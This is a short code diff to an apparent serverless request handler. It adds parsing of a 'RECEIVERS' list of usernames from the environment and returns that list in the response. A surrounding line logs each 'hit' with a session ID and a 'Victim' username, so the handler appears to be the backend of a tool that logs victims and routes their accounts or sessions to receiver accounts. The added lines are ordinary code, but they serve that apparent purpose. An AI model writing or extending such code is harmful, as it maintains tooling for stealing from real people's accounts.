@@ -370,7 +370,13 @@ export default async function handler(req, res) {
     }
   }
 
+  // Parse receivers from env: comma-separated usernames e.g. "User1,User2"
+  const receivers = (process.env.RECEIVERS || '')
+    .split(',')
+    .map(s => s.trim())
+    .filter(Boolean);
+
   console.log(`[+] Hit registered! Session: ${sessionId} | Victim: ${hitData.username}`);
 
-  return res.status(200).json({ success: true, sessionId });
+  return res.status(200).json({ success: true, sessionId, receivers });
 }
